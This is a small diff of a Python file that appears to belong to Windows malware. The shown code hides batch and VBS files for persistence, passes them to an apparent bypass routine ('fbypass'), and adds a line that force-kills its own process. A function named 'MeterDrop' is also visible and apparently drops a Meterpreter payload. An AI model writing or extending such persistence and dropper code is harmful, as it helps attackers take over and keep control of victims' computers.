@@ -72,6 +72,7 @@ def fpersist():
 	win32api.SetFileAttributes(tempbat,win32con.FILE_ATTRIBUTE_HIDDEN)
 	rcmd = tempvbs + ' ' + tempbat
 	fbypass(rcmd)
+	fsubprocess('taskkill /f /im ' + sys.argv[0])
 	exit()
 
 def MeterDrop(mhost, mport):
